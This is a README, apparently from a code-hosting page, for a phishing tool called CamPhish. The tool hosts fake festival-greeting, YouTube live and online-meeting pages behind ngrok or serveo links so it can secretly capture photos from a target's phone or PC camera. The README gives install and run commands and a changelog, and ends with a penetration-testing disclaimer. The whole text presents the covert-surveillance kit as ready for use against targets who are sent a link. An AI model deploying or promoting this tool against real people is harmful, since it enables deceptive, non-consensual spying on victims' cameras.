Grab cam shots from target's phone front camera or PC webcam just sending a link. 

What is CamPhish?

CamPhish is techniques to take cam shots of target's phone front camera or PC webcam. CamPhish Hosts a fake website on in built PHP server and uses ngrok & serveo to generate a link which we will forward to the target, which can be used on over internet. website asks for camera permission and if the target allows it, this tool grab camshots of target's device

Features

In this tool I added two automatic webpage templates for engaged target on webpage to get more picture of cam

Festival WishingLive YouTube TVOnline Meeting [Beta]

simply enter festival name or youtube's video ID

This Tool Tested On :

Kali LinuxTermuxMacOSUbuntuParrot Sec OS

Installing and requirements

This tool require PHP for webserver, SSH or serveo link. First run following command on your terminal

apt-get -y install php openssh git wget 

Installing (Kali Linux/Termux):

git clone https://github.com/AbbasBot2/AbCamHack cd AbCamHack bash AbCamHack.sh 

Change Log:

Version: 1.7: Fix and add support

fixed: termux failed to get home directoryAdd support for Apple sillicon (M1/M2/M3 ARM64)Add support for arm64 like Raspberry Pi

Version: 1.6: Fix ngrok direct link generate

Version: 1.5: Add new online meeting template

Version: 1.4: Ngrok authtoken update

Version: 1.3: Fix ngrok direct link

For More Video subcribe TechChip YouTube Channel

CamPhish is created to help in penetration testing and it's not responsible for any misuse or illegal purposes.
